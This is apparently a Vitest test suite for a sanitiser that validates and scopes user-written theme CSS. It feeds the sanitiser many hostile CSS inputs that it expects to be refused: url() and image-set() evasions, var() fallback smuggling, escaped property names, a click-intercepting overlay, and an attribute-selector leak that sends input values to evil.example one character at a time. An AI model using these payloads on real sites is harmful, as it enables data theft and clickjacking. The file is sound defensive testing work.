import { describe, expect, it } from 'vitest';
import {
  MAX_CUSTOM_CSS_BYTES,
  sanitiseCustomCss,
  scopeCustomCss,
} from '../utils/themeCss';

// The owner's free-form CSS.
//
// Two things are being tested, and only one of them is "does it work". The other
// is whether the check survives the ways CSS lets you write the same thing —
// which is the entire reason this parses instead of searching for `url(`.

/** Validated and regenerated, but not scoped. */
function ok(css: string, slug = 'nocturne') {
  const r = sanitiseCustomCss(css, slug);
  if (!r.ok) throw new Error('expected ok, got: ' + JSON.stringify(r.issues));
  return r.css;
}

/** What actually reaches the stylesheet: validated, then scoped. */
function emitted(css: string, slug = 'nocturne') {
  return scopeCustomCss(ok(css, slug), slug);
}

function refused(css: string, slug = 'nocturne') {
  const r = sanitiseCustomCss(css, slug);
  expect(r.ok, `expected refusal for: ${css}`).toBe(false);
  return r.ok ? [] : r.issues;
}

describe('url() cannot get through', () => {
  it('refuses the obvious form', () => {
    const issues = refused('.card { background-image: url(https://evil.example/x.png); }');
    expect(issues[0]!.reason).toMatch(/url\(\) is not allowed/);
  });

  it('refuses every spelling a substring check would miss', () => {
    // Each of these is valid CSS that loads a remote image, and each defeats
    // `css.includes('url(')`. This is the test that justifies the dependency.
    const evasions = [
      // Case.
      '.a { background: URL(https://evil.example/x); }',
      // An escaped character in the function name.
      String.raw`.a { background: u\72 l(https://evil.example/x); }`,
      // A hex escape for the leading letter.
      String.raw`.a { background: \75 rl(https://evil.example/x); }`,
      // A comment inside the name.
      '.a { background: ur/**/l(https://evil.example/x); }',
      // Whitespace before the paren is NOT allowed for functions, but the
      // quoted-string form is another spelling entirely.
      '.a { background-image: url("https://evil.example/x"); }',
      // Not `background` at all.
      '.a { cursor: url(https://evil.example/c.cur), pointer; }',
      '.a { list-style-image: url(https://evil.example/x); }',
      '.a { border-image-source: url(https://evil.example/x); }',
      '.a { mask-image: url(https://evil.example/x); }',
      '.a { filter: url(https://evil.example/x#f); }',
      // Inside a gradient, inside a shorthand.
      '.a { background: #000 url(https://evil.example/x) no-repeat; }',
      // Inside an allowed at-rule.
      '@media (min-width: 1px) { .a { background: url(https://evil.example/x); } }',
      // Inside keyframes.
      '@keyframes k { to { background: url(https://evil.example/x); } }',
      // A data: URI is still a Url node, and allowing it would mean allowing
      // the parser to be the only thing between us and a very long allow-list.
      '.a { background: url(data:image/svg+xml,%3Csvg%3E); }',
    ];
    for (const css of evasions) {
      const issues = refused(css);
      expect(
        issues.some((i) => /url\(\)|Could not parse|Not understood/.test(i.reason)),
        css,
      ).toBe(true);
    }
  });

  it('refuses the attribute-selector read that makes url() worth banning', () => {
    // The reason `url()` is the line: this pattern reads an input's value one
    // character per request, without a line of JavaScript.
    refused(
      'input[value^="a"] { background-image: url(https://evil.example/leak?c=a); }',
    );
  });
});

describe('at-rules', () => {
  it('allows the conditionals and keyframes', () => {
    ok('@media (min-width: 40rem) { .a { color: red; } }');
    ok('@supports (display: grid) { .a { display: grid; } }');
    ok('@container (min-width: 20rem) { .a { color: red; } }');
    ok('@keyframes spin { from { rotate: 0deg; } to { rotate: 360deg; } }');
  });

  it('refuses @layer', () => {
    // A global ordering directive. A stylesheet whose every selector is
    // prefixed with a theme root gains nothing from it, and declaring a layer
    // name the application also uses changes where the application's own rules
    // land in the cascade.
    refused('@layer base { .a { color: red; } }');
  });

  it('refuses @import even though the CSP would also block it', () => {
    // Belt and braces on purpose: `style-src 'self'` stops a cross-origin
    // import, and a same-origin one is still a request this feature has no
    // reason to make.
    const issues = refused("@import url('/other.css');");
    expect(issues.some((i) => /@import|url\(\)/.test(i.reason))).toBe(true);
  });

  it('refuses @font-face', () => {
    // It would let a theme redefine one of the curated families out from under
    // the font role that selected it, and point `src` wherever it liked.
    const issues = refused("@font-face { font-family: 'Inter'; src: local(Foo); }");
    expect(issues[0]!.reason).toMatch(/@font-face is not allowed/);
  });

  it('refuses @property', () => {
    // It registers a custom property globally, with a syntax and an inherit
    // flag — which changes how the application's own tokens cascade and
    // animate, well outside the theme that declared it.
    refused('@property --accent { syntax: "<color>"; inherits: true; initial-value: red; }');
  });

  it('refuses the ones nobody expects to be there', () => {
    for (const css of [
      '@charset "utf-8";',
      '@namespace svg url(http://www.w3.org/2000/svg);',
      '@page { margin: 1cm; }',
      '@viewport { width: 100vw; }',
    ]) {
      refused(css);
    }
  });
});

describe('what the parser did not understand is not passed through', () => {
  it('is not fooled by a parser differential, because it regenerates', () => {
    // A missing final brace is RECOVERED by css-tree into a complete rule, and
    // that is fine — the output is regenerated from the AST, so a browser only
    // ever sees css-tree's reading. There is no "the checker saw X and Chrome
    // sees Y" here, which is the property that makes the whole approach sound.
    const out = sanitiseCustomCss('.a { color: red;', 'nocturne');
    expect(out.ok).toBe(true);
    if (out.ok) {
      expect(out.css).toBe('.a{color:red}');
      // Balanced, whatever went in.
      expect((out.css.match(/\{/g) ?? []).length).toBe((out.css.match(/\}/g) ?? []).length);
    }
  });

  it('refuses garbage it cannot make sense of', () => {
    refused('.a } color: red {');
  });

  it('refuses a declaration whose value it cannot parse', () => {
    const issues = refused('.a { color: ~~~; }');
    expect(issues.length).toBeGreaterThan(0);
  });

  it('refuses the properties that load code', () => {
    expect(refused('.a { -moz-binding: something; }')[0]!.reason).toMatch(/loads and runs/);
    expect(refused('.a { behavior: something; }')[0]!.reason).toMatch(/loads and runs/);
  });
});

describe('the overlay, which needs no exfiltration channel at all', () => {
  // The plan called UI redressing the most underestimated risk here, and it is
  // right: every other CSS attack needs somewhere to send the data, and this one
  // just needs to be on top of the page.
  it('refuses the classic click-intercepting overlay', () => {
    const issues = refused(
      'body::before { position: fixed; inset: 0; z-index: 9999; content: ""; }',
    );
    expect(issues[0]!.reason).toMatch(/position is not allowed/);
  });

  it('refuses absolute too, not just fixed', () => {
    // A rule that catches one spelling is a rule that teaches you to trust it.
    // `position: absolute` on a body-level selector covers the page just as well.
    refused('body::after { position: absolute; inset: 0; content: ""; }');
    refused('.a { position: sticky; }');
    refused('.a { POSITION: FIXED; }');
  });

  it('still allows everything a theme is actually for', () => {
    // The refusal has to be narrow enough that the feature keeps its point:
    // this is the sort of override raw CSS exists for.
    const out = ok(`
      .card { background: rgb(var(--bg-elevated)); border-radius: var(--radius-lg); }
      .badge { color: rgb(var(--accent-warm-fg)); letter-spacing: .04em; }
      .row:hover { box-shadow: 0 2px 8px rgb(var(--shadow-color) / 0.2); }
      .grid { display: grid; gap: 1rem; z-index: 2; }
    `);
    expect(out).toContain('border-radius');
    // `z-index` on its own is harmless — without positioning it cannot lift
    // anything over the page — so it is not worth the false refusals.
    expect(out).toContain('z-index');
  });
});

describe('scoping', () => {
  it('puts every selector under the theme root', () => {
    const out = emitted('.card { color: red; } .pill { color: blue; }');
    expect(out).toContain(':root[data-theme="nocturne"] .card');
    expect(out).toContain(':root[data-theme="nocturne"] .pill');
  });

  it('replaces rather than prefixes a root selector', () => {
    // `:root[data-theme='x'] html` matches nothing — `html` has no `html`
    // ancestor — so prefixing would silently drop the rule.
    const out = emitted('html { color: red; } :root { --x: 1; }');
    expect(out).toContain(':root[data-theme="nocturne"]{color:red}');
    expect(out).not.toContain('nocturne"] html');
    expect(out).not.toContain('nocturne"] :root');
  });

  it('prefixes body, which does have an ancestor', () => {
    expect(emitted('body { color: red; }')).toContain(':root[data-theme="nocturne"] body');
  });

  it('scopes each selector in a list, not just the first', () => {
    const out = emitted('.a, .b { color: red; }');
    expect(out).toContain(':root[data-theme="nocturne"] .a');
    expect(out).toContain(':root[data-theme="nocturne"] .b');
  });

  it('scopes inside a media query', () => {
    const out = emitted('@media (min-width: 1px) { .a { color: red; } }');
    expect(out).toContain(':root[data-theme="nocturne"] .a');
  });

  it('leaves keyframe selectors alone', () => {
    // `from`, `to` and percentages are not selectors. Scoping them would
    // produce `:root[data-theme='x'] from`, which is a valid selector for an
    // element named `from` and therefore silently breaks the animation.
    const out = emitted('@keyframes k { from { opacity: 0; } 50% { opacity: 0.5; } to { opacity: 1; } }');
    // Renamed, per the block below — what this test is about is the SELECTORS.
    expect(out).toContain('@keyframes nocturne--k');
    expect(out).not.toContain('nocturne"] from');
    expect(out).not.toContain('nocturne"] 50%');
    expect(out).toContain('from{opacity:0}');
  });

  it('cannot be escaped by a selector that tries to climb out', () => {
    // Prefixing makes every selector a descendant of the theme root, so there
    // is no combinator that reaches a sibling or ancestor of `:root`.
    const out = emitted('* { color: red; }');
    expect(out).toBe(':root[data-theme="nocturne"] *{color:red}');
  });
});

describe('the size cap', () => {
  it('refuses more than the cap', () => {
    const big = '.a { color: red; }'.repeat(2000);
    expect(big.length).toBeGreaterThan(MAX_CUSTOM_CSS_BYTES);
    expect(refused(big)[0]!.reason).toMatch(/Too long/);
  });

  it('counts bytes rather than characters', () => {
    // A content string of astral-plane characters is four bytes each; a
    // character count would let four times the payload through.
    const css = `.a { content: "${'\u{1F600}'.repeat(5000)}"; }`;
    expect(css.length).toBeLessThan(MAX_CUSTOM_CSS_BYTES * 2);
    expect(Buffer.byteLength(css, 'utf8')).toBeGreaterThan(MAX_CUSTOM_CSS_BYTES);
    expect(refused(css)[0]!.reason).toMatch(/Too long/);
  });
});

describe('what it lets through', () => {
  it('accepts the kind of thing this feature exists for', () => {
    // Overriding a component the token schema does not reach — which is the
    // stated reason free CSS is offered at all.
    const out = ok(`
      .torrent-row:hover { background: rgb(var(--accent-warm) / 0.06); }
      .poster-hover { border-radius: var(--radius-xl); }
      @media (max-width: 40rem) {
        .sidebar { display: none; }
      }
    `);
    expect(out).toContain('.torrent-row:hover');
    expect(out).toContain('var(--accent-warm)');
  });

  it('accepts an empty string', () => {
    expect(ok('')).toBe('');
  });

  it('accepts custom properties, and checks inside them', () => {
    // css-tree parses a custom property's value as `Raw`, correctly — they have
    // no grammar. Accepting a `Raw` unexamined would be a specific hole, not a
    // theoretical one: this application feeds `var(--bg-pattern-image)` to
    // `background-image`.
    expect(ok(':root { --my-tint: rgb(20 20 20 / 0.4); }')).toContain('--my-tint');
    const issues = refused(':root { --bg-pattern-image: url(https://evil.example/x); }');
    expect(issues[0]!.reason).toMatch(/url\(\) is not allowed/);
  });
});

describe('keyframes are global, so they get renamed', () => {
  it('namespaces the name with the slug', () => {
    // Selector prefixing cannot scope an `@keyframes`. Without the rename, a
    // theme's `@keyframes spin` silently redefines the animation the rest of the
    // site — and every other theme — uses.
    const out = ok('@keyframes spin { to { rotate: 360deg; } }');
    expect(out).toContain('@keyframes nocturne--spin');
    expect(out).not.toContain('@keyframes spin');
  });

  it('rewrites the references so the animation still runs', () => {
    const out = ok(
      '@keyframes pulse { to { opacity: 0.5; } } .a { animation: pulse 1s infinite; }',
    );
    expect(out).toContain('@keyframes nocturne--pulse');
    expect(out).toContain('animation:nocturne--pulse 1s infinite');
  });

  it('rewrites animation-name too', () => {
    const out = ok('@keyframes k { to { opacity: 0; } } .a { animation-name: k; }');
    expect(out).toContain('animation-name:nocturne--k');
  });

  it('leaves an animation that refers to something it did not declare', () => {
    // A theme may well want to reuse one of the application's own animations,
    // and renaming a name it never declared would break exactly that.
    const out = ok('.a { animation: some-app-animation 1s; }');
    expect(out).toContain('animation:some-app-animation 1s');
  });
});

// ── URLs that are not `url()` ─────────────────────────────────────────────
//
// The gap review found. `Url` is a css-tree node type, not a concept: CSS
// Images 4 lets several functions take a bare string where a URL goes, and every
// one of those parses as `Function` + `String`, so a rule written as "no `Url`
// node" waves them through. `image-set()` is supported everywhere, which made
// this a working exfiltration channel and not a theoretical one.
//
// The fix is an allow-list of functions, so the test that matters is not "are
// these four refused" — it is "is anything outside the list refused", which is
// what keeps the next one from needing a fix at all.
describe('functions', () => {
  const bare = (fn: string) => `.a { background-image: ${fn} }`;

  it.each([
    ['image-set', bare('image-set("https://evil/x" 1x)')],
    ['-webkit-image-set', bare('-webkit-image-set("https://evil/x" 1x)')],
    ['src', bare('src("https://evil/x")')],
    ['cross-fade', bare('cross-fade("https://evil/x" 50%)')],
    ['image', bare('image("https://evil/x")')],
    ['-moz-element', bare('-moz-element(#x)')],
    ['paint', bare('paint(worklet)')],
  ])('refuses %s, which takes its URL as a string', (_name, css) => {
    expect(refused(css)[0]!.reason).toMatch(/is not allowed/);
  });

  it('refuses one inside a custom property too', () => {
    // The path that used to be checked for `Url` alone — and the one that
    // matters most, because the application feeds `--bg-pattern-image` straight
    // into `background-image`.
    refused(':root { --bg-pattern-image: image-set("https://evil/x" 1x); }');
  });

  it('refuses a function nobody has heard of, which is the point', () => {
    refused('.a { color: some-future-fetching-function("https://evil/x") }');
  });

  it.each([
    ['arithmetic', '.a { width: clamp(1rem, calc(2vw + 1px), 3rem) }'],
    ['colour', '.a { color: color-mix(in oklab, rgb(1 2 3), oklch(50% .1 20)) }'],
    ['the token convention', '.a { color: rgb(var(--accent) / calc(.5 * var(--shadow-strength))) }'],
    ['gradients', '.a { background: linear-gradient(to right, red, blue) }'],
    ['filters', '.a { filter: drop-shadow(0 0 2px rgb(0 0 0/.3)) blur(2px) }'],
    ['transforms', '.a { transform: translateX(1px) rotate(3deg) scale(1.1) }'],
    ['easing', '.a { transition: all .2s cubic-bezier(.4,0,.2,1) }'],
    ['track sizing', '.a { grid-template-columns: repeat(auto-fill, minmax(10px,1fr)) }'],
    ['counters', '.a::after { content: "hi" counter(x) }'],
    ['shapes', '.a { clip-path: polygon(0 0, 100% 0, 100% 100%) }'],
    ['a function in an at-rule prelude', '@media (min-width: calc(10px + 1em)) { .a { color: red } }'],
  ])('still accepts %s', (_name, css) => {
    expect(ok(css)).toBeTruthy();
  });

  it('leaves selectors alone', () => {
    // `:is()`, `:not()`, `:has()` and `:nth-child()` parse as
    // `PseudoClassSelector`, never as `Function`. Asserted rather than assumed:
    // an allow-list that quietly ate `:not()` would be a worse bug than the one
    // it closes.
    expect(
      ok('.a:not(.b):is(.c,.d):nth-child(2n+1):has(> .e)::before { color: red }'),
    ).toContain(':not(.b)');
  });
});

// ── Escaped property names ───────────────────────────────────────────────
//
// The hole a review found in the one blocklist this module has. Everything else
// is an allow-list and closed by default; `REFUSED_PROPERTIES` is not, and it
// can only refuse a name it recognises.
//
// css-tree decodes CSS escapes in at-rule names and function names — `@imp\6frt`
// and `u\72l(` are both caught — but NOT in `Declaration.property`. `p\6fsition`
// arrived spelled that way, missed the lookup, and was re-emitted byte for byte,
// where the browser decodes it and applies `position: fixed`. Verified in both
// halves at the time: css-tree accepted it and a rendering engine drew the
// overlay.
//
// The fix is a shape check rather than an unescaper, so these tests are really
// about one property: a property name that is not a plain identifier does not
// reach the lookup at all.
describe('property names', () => {
  it.each([
    ['position', String.raw`.a { p\6fsition: fixed }`],
    ['position, six digits', String.raw`.a { p\00006fsition: fixed }`],
    ['position, uppercase escape', String.raw`.a { P\4Fsition: fixed }`],
    ['-moz-binding', String.raw`.a { -moz-b\69nding: none }`],
    ['behavior', String.raw`.a { behavi\6fr: none }`],
  ])('refuses %s spelled with an escape', (_name, css) => {
    expect(refused(css)[0]!.reason).toMatch(/not a property name/);
  });

  it('refuses an escaped CUSTOM property too', () => {
    // The one that matters most: this application reads `--bg-pattern-image`
    // back into `background-image`, so a second way to spell it is a second way
    // to set it.
    refused(String.raw`:root { --bg-pattern-imag\65: none }`);
  });

  it.each([
    ['an ordinary property', '.a { color: red }'],
    ['a vendor prefix', '.a { -webkit-font-smoothing: antialiased }'],
    ['a custom property', ':root { --my-thing: 3px }'],
    ['a custom property with digits', ':root { --chart-1: 1 2 3 }'],
    ['a hyphenated property', '.a { border-top-left-radius: 4px }'],
  ])('still accepts %s', (_name, css) => {
    expect(ok(css)).toBeTruthy();
  });
});

// ── What a walk does not see ─────────────────────────────────────────────
//
// The most serious hole an adversarial review found, and the one that reopened
// the whole exfiltration channel. css-tree parses a `var()` FALLBACK as a single
// childless `Raw`, so a walk sees the allowed `var` Function and never sees what
// is inside its second argument. Both value rules were skipped, every refused
// function could ride through, and the reviewer confirmed the requests firing in
// Chrome — including the `input[value^="…"]` character-by-character read this
// module exists to stop.
//
// `env()` was never affected, because css-tree parses ITS fallback into real
// nodes. That asymmetry is why the gap in `var()` went unnoticed.
describe('var() fallbacks', () => {
  it.each([
    ['a url', '.a { background-image: var(--n, url(https://evil/x)) }'],
    ['a refused function', '.a { background-image: var(--n, image-set("https://evil/x" 1x)) }'],
    ['nested inside an allowed function', '.a { background: linear-gradient(red, var(--n, url(https://evil/x))) }'],
    ['nested inside another fallback', '.a { background-image: var(--n, var(--m, url(https://evil/x))) }'],
    ['inside a custom property', ':root { --q: var(--n, url(https://evil/x)) }'],
    ['behind a comment', '.a { background-image: var(--n,/**/url(https://evil/x)) }'],
    ['in an env() fallback', '.a { background-image: env(--n, url(https://evil/x)) }'],
  ])('refuses %s hidden in one', (_name, css) => {
    refused(css);
  });

  it.each([
    ['a length fallback', '.a { width: var(--x, 3px) }'],
    ['no fallback at all', '.a { color: var(--accent) }'],
    ['a nested legitimate fallback', '.a { width: var(--x, var(--y, 2rem)) }'],
    ['the token convention', '.a { color: rgb(var(--accent) / var(--a, .5)) }'],
  ])('still accepts %s', (_name, css) => {
    expect(ok(css)).toBeTruthy();
  });

  it('says each problem once', () => {
    // The top-level walk and the value check deliberately overlap — the first
    // also covers at-rule preludes, the second also covers what a `Raw` hides.
    // Overlapping cover is the point; saying it twice to the owner is not.
    const issues = refused('.a { background-image: url(https://evil/x) }');
    expect(issues).toHaveLength(1);
  });
});

// ── The separator, and why it is two hyphens ─────────────────────────────
describe('keyframe namespacing is injective', () => {
  it('cannot collide across two themes', () => {
    // With a single hyphen it could, and keyframes are GLOBAL: slug `a` naming
    // `b-x` and slug `a-b` naming `x` both produced `a-b-x`, so one theme
    // silently redefined the other's animation for every visitor using it.
    // `SLUG_PATTERN` forbids a double hyphen inside a slug, which is what makes
    // this separator unambiguous. Found in an adversarial review.
    const one = ok('@keyframes b-x { to { opacity: 0 } }', 'a');
    const two = ok('@keyframes x { to { opacity: 0 } }', 'a-b');
    const nameOf = (css: string) => /@keyframes ([\w-]+)/.exec(css)?.[1];
    expect(nameOf(one)).not.toBe(nameOf(two));
  });

  it('still rewrites the reference to match', () => {
    const out = ok('@keyframes x { to { opacity: 0 } } .a { animation: x 1s }', 'a-b');
    expect(out).toContain('@keyframes a-b--x');
    expect(out).toContain('animation:a-b--x 1s');
  });
});
